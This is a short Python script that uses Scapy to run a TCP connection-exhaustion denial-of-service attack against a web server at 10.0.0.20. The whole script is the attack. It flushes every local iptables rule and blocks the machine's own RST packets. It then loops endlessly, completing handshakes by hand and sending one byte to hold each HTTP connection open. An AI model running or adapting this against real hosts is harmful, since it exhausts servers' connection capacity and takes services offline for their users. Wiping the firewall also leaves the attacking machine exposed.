from scapy.all import *
import os
#cancel the rst of invalid packets in iptables
os.system('iptables -F')
os.system('iptables -A OUTPUT -d 10.0.0.20 -p tcp --tcp-flags RST RST -j DROP')
while True:
	ans=sr1(IP(dst='10.0.0.20')/TCP(dport=80, sport=RandShort()))
	if ans[TCP].flags=='SA':
		pktans = IP(dst=ans[IP].src , src=ans[IP].dst)/TCP(sport=ans[TCP].dport,dport=ans[TCP].sport,ack=ans[TCP].seq+1,seq=ans[TCP].ack,flags='A')/Raw(load='G')
		send(pktans)

